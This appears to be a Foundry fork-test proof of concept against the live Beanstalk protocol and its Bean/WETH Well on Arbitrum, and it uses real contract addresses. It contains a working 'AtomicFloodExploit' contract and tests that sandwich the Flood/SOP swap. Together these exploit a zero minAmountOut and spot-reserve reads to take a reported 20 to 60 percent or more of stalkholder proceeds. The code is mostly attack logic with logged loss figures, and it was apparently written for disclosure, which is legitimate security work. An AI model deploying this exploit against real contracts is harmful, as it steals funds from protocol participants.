// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWell {
    function getReserves() external view returns (uint256[] memory);
    function tokens() external view returns (IERC20[] memory);
    function swapFrom(
        IERC20 fromToken,
        IERC20 toToken,
        uint256 amountIn,
        uint256 minAmountOut,
        address recipient,
        uint256 deadline
    ) external returns (uint256 amountOut);
}

interface IBeanstalk {
    function sunrise() external;
    function paused() external view returns (bool);
}

/// @notice Demonstrates that a smart contract can call both Well.swapFrom
/// and Beanstalk.sunrise() in a single transaction. In production, the
/// attacker deploys this and calls attack() atomically — no mempool needed.
contract AtomicFloodExploit {
    IWell  immutable well;
    IERC20 immutable bean;
    IERC20 immutable weth;
    address immutable beanstalk;
    uint256 public wethHeld;

    constructor(address _well, address _bean, address _weth, address _beanstalk) {
        well = IWell(_well);
        bean = IERC20(_bean);
        weth = IERC20(_weth);
        beanstalk = _beanstalk;
    }

    /// @notice Step 1: front-run — sell Bean to degrade pool before SOP
    function frontRun(uint256 beanAmount) external {
        bean.approve(address(well), beanAmount);
        wethHeld = well.swapFrom(
            bean, weth, beanAmount, 0, address(this), type(uint256).max
        );
    }

    /// @notice Step 2: call sunrise() — triggers SOP at degraded rate
    function triggerSunrise() external {
        // Permissionless — anyone can call. Reverts if season not ready,
        // but NOT for access control reasons.
        IBeanstalk(beanstalk).sunrise();
    }

    /// @notice Step 3: back-run — buy Bean back cheap after SOP
    function backRun() external returns (uint256 beanOut) {
        weth.approve(address(well), wethHeld);
        beanOut = well.swapFrom(
            weth, bean, wethHeld, 0, msg.sender, type(uint256).max
        );
    }
}

/// Fork test against live Bean/WETH Basin Well on Arbitrum.
///
/// Pinned to block 440420446 (March 10 2026) for reproducibility.
/// ETH price at this block: ~$2,036 (Chainlink Arbitrum feed).
///
/// Two code defects in LibFlood.sol:
///   1. sopWell() passes minAmountOut=0 to IWell.swapFrom (line 362)
///   2. getWellsByDeltaB() reads spot reserves via currentDeltaB (line 270)
///      instead of TWA reserves via cappedReservesDeltaB
///
/// These let anyone extract value from SOP distributions atomically.
contract FloodSandwichTest is Test {

    address constant BEANSTALK = 0xD1A0060ba708BC4BCD3DA6C37EFa8deDF015FB70;
    address constant BEAN      = 0xBEA0005B8599265D41256905A9B3073D397812E4;
    address constant WETH      = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant WELL      = 0xBeA00Aa8130aCaD047E137ec68693C005f8736Ce;
    uint256 constant FORK_BLOCK = 440420446;
    uint256 constant ETH_USD   = 2036; // ETH/USD at fork block

    IWell  well  = IWell(WELL);
    IERC20 bean  = IERC20(BEAN);
    IERC20 weth  = IERC20(WETH);

    address attacker  = makeAddr("attacker");
    address beanstalk = BEANSTALK;

    function setUp() public {
        vm.createSelectFork("https://arb1.arbitrum.io/rpc", FORK_BLOCK);
    }

    // -----------------------------------------------------------------
    // 1. sunrise() is permissionless — callable by any address.
    //    Reverts with "Still current Season" (not an access control error).
    //    This means the attacker controls when it fires.
    // -----------------------------------------------------------------
    function test_sunriseIsPermissionless() public {
        vm.prank(attacker);
        try IBeanstalk(BEANSTALK).sunrise() {
            // If it succeeds, that's fine — still proves no access control
        } catch (bytes memory reason) {
            // Decode the revert reason
            string memory decoded = abi.decode(_sliceBytes(reason, 4), (string));
            console.log("sunrise() revert reason:", decoded);

            // It says "Still current Season" — NOT "Unauthorized" or "Only owner"
            // This confirms anyone can call sunrise() when the season is ready
            assertTrue(
                keccak256(bytes(decoded)) == keccak256("Season: Still current Season."),
                "should revert for season timing, not access control"
            );
        }
    }

    // -----------------------------------------------------------------
    // 2. Spot reserves are manipulable in the same block.
    //    getWellsByDeltaB() reads these to compute SOP amounts.
    //    (LibDeltaB.currentDeltaB, lines 46-57)
    // -----------------------------------------------------------------
    function test_spotReservesManipulable() public {
        uint256[] memory r0 = well.getReserves();

        deal(address(weth), attacker, 1 ether);
        vm.startPrank(attacker);
        weth.approve(WELL, 1 ether);
        well.swapFrom(weth, bean, 1 ether, 0, attacker, type(uint256).max);
        vm.stopPrank();

        uint256[] memory r1 = well.getReserves();

        uint256 beanDropPct = (r0[0] - r1[0]) * 100 / r0[0];
        console.log("bean reserve before:", r0[0]);
        console.log("bean reserve after: ", r1[0]);
        console.log("bean drop:          ", beanDropPct, "%");
        console.log("from a single 1 WETH swap ($%s)", ETH_USD);

        assertGt(r1[1], r0[1], "WETH reserve increased");
        assertLt(r1[0], r0[0], "Bean reserve decreased");
        assertGt(beanDropPct, 10, "significant manipulation from tiny swap");
    }

    // -----------------------------------------------------------------
    // 3. Core exploit: sandwich the SOP swap for 24% extraction.
    //
    //    SOP sells Bean->WETH. Attacker sells Bean first (same direction)
    //    to drain WETH, then buys Bean back cheap after SOP dumps more.
    //
    //    This is NOT mempool front-running. The attacker calls sunrise()
    //    themselves — it's permissionless. The entire sequence can run
    //    in a single atomic transaction (see AtomicFloodExploit above).
    //
    //    Works because sopWell() passes minAmountOut=0 (LibFlood.sol:362).
    // -----------------------------------------------------------------
    function test_sopSandwichExtraction() public {
        uint256[] memory r = well.getReserves();
        uint256 beanRes = r[0];
        uint256 wethRes = r[1];

        // SOP amount: 5% of Bean reserve (realistic for a Flood event)
        uint256 sopBeans = beanRes * 5 / 100;

        console.log("--- pool state ---");
        console.log("bean reserve:  %s (~%s Bean)", beanRes, beanRes / 1e6);
        console.log("weth reserve:  %s (~%s.%s WETH)", wethRes, wethRes / 1e18, (wethRes % 1e18) / 1e16);
        console.log("pool value:    ~$%s", (wethRes * ETH_USD * 2) / 1e18);
        console.log("sopBeans:       %s", sopBeans);

        // --- Fair SOP (no attack) ---
        uint256 snap = vm.snapshotState();
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 fairWethOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();
        vm.revertToState(snap);

        // --- Sandwiched SOP ---
        uint256 attackBean = beanRes * 15 / 100; // 15% of reserve
        deal(address(bean), attacker, attackBean);

        // Front-run: sell Bean for WETH
        vm.startPrank(attacker);
        bean.approve(WELL, attackBean);
        uint256 attackWethOut = well.swapFrom(
            bean, weth, attackBean, 0, attacker, type(uint256).max
        );
        vm.stopPrank();

        // SOP swap at degraded rate
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 attackedWethOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();

        // Back-run: buy Bean back cheap
        vm.startPrank(attacker);
        weth.approve(WELL, attackWethOut);
        uint256 attackBeanBack = well.swapFrom(
            weth, bean, attackWethOut, 0, attacker, type(uint256).max
        );
        vm.stopPrank();

        // --- Results ---
        uint256 stakeholderLoss = fairWethOut - attackedWethOut;
        uint256 lossPct = stakeholderLoss * 100 / fairWethOut;
        uint256 lossUsd = stakeholderLoss * ETH_USD / 1e18;
        uint256 fairUsd = fairWethOut * ETH_USD / 1e18;

        console.log("--- fair SOP ---");
        console.log("WETH to stalkholders: %s (~$%s)", fairWethOut, fairUsd);
        console.log("--- attacked SOP ---");
        console.log("WETH to stalkholders: %s (~$%s)", attackedWethOut, attackedWethOut * ETH_USD / 1e18);
        console.log("--- damage ---");
        console.log("stalkholder WETH loss: %s (~$%s)", stakeholderLoss, lossUsd);
        console.log("extraction rate:       %s%%", lossPct);
        if (attackBeanBack > attackBean) {
            console.log("attacker Bean profit:  %s", attackBeanBack - attackBean);
        }

        assertLt(attackedWethOut, fairWethOut, "stalkholders receive less WETH");
        assertGt(lossPct, 20, "extraction exceeds 20%");
    }

    // -----------------------------------------------------------------
    // 4. Even 80% pool manipulation does not revert the SOP.
    //    minAmountOut=0 means literally any rate is accepted.
    //    With slippage protection, the swap would correctly revert.
    // -----------------------------------------------------------------
    function test_extremeManipulationDoesNotRevert() public {
        uint256[] memory r = well.getReserves();

        // Fair baseline
        uint256 sopBeans = r[0] * 5 / 100;
        uint256 snap = vm.snapshotState();
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 fairOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();
        vm.revertToState(snap);

        // Extreme manipulation: dump 80% of Bean reserve
        uint256 hugeDump = r[0] * 80 / 100;
        deal(address(bean), attacker, hugeDump);
        vm.startPrank(attacker);
        bean.approve(WELL, hugeDump);
        well.swapFrom(bean, weth, hugeDump, 0, attacker, type(uint256).max);
        vm.stopPrank();

        uint256[] memory r2 = well.getReserves();
        uint256 wethDrainPct = (r[1] - r2[1]) * 100 / r[1];

        // SOP still goes through at terrible rate
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 badOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();

        uint256 damagePct = (fairOut - badOut) * 100 / fairOut;

        console.log("WETH drained from pool: %s%%", wethDrainPct);
        console.log("fair SOP output:  %s (~$%s)", fairOut, fairOut * ETH_USD / 1e18);
        console.log("bad SOP output:   %s (~$%s)", badOut, badOut * ETH_USD / 1e18);
        console.log("stalkholder loss: %s%%", damagePct);
        console.log("swap reverted:    NO (minAmountOut=0 accepts anything)");

        assertGt(badOut, 0, "swap succeeds even after 80% manipulation");
        assertGt(damagePct, 60, "stalkholders lose over 60% of SOP proceeds");
    }

    // -----------------------------------------------------------------
    // 5. Smart contract can call Well.swapFrom + sunrise() atomically.
    //    Shows the attack does NOT need mempool front-running.
    //    The contract front-runs the pool, the SOP executes internally
    //    during sunrise(), then the contract back-runs.
    //    sunrise() reverts here (wrong season), so we simulate the SOP
    //    step manually — but the key point is the contract CAN call it.
    // -----------------------------------------------------------------
    function test_atomicExploitViContract() public {
        uint256[] memory r = well.getReserves();
        uint256 sopBeans = r[0] * 5 / 100;

        // Fair baseline
        uint256 snap = vm.snapshotState();
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 fairOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();
        vm.revertToState(snap);

        // Deploy the atomic exploit contract
        AtomicFloodExploit exploit = new AtomicFloodExploit(WELL, BEAN, WETH, BEANSTALK);
        uint256 attackBeans = r[0] * 15 / 100;
        deal(address(bean), address(exploit), attackBeans);

        // Step 1: contract front-runs (degrades pool)
        exploit.frontRun(attackBeans);

        // Step 2: sunrise() would be called here in production.
        // It triggers sopWell() internally, which does the Bean->WETH swap
        // at the now-degraded rate. We simulate that swap since sunrise()
        // reverts for timing reasons (not access control).
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 attackedOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();

        // Step 3: contract back-runs (buys Bean cheap)
        uint256 beanBack = exploit.backRun();

        uint256 lossPct = (fairOut - attackedOut) * 100 / fairOut;
        console.log("exploit contract:  %s", address(exploit));
        console.log("fair SOP:          %s WETH (~$%s)", fairOut, fairOut * ETH_USD / 1e18);
        console.log("attacked SOP:      %s WETH (~$%s)", attackedOut, attackedOut * ETH_USD / 1e18);
        console.log("extraction:        %s%%", lossPct);
        if (beanBack > attackBeans) {
            console.log("attacker profit:   %s Bean", beanBack - attackBeans);
        }
        console.log("mempool needed:    NO (contract calls sunrise directly)");

        assertLt(attackedOut, fairOut, "contract-based attack extracts value");
        assertGt(lossPct, 20, "extraction exceeds 20%");
    }

    // Helper to slice bytes (skip first 4 bytes of revert data = selector)
    function _sliceBytes(bytes memory data, uint256 start) internal pure returns (bytes memory) {
        bytes memory result = new bytes(data.length - start);
        for (uint256 i = 0; i < result.length; i++) {
            result[i] = data[i + start];
        }
        return result;
    }
}
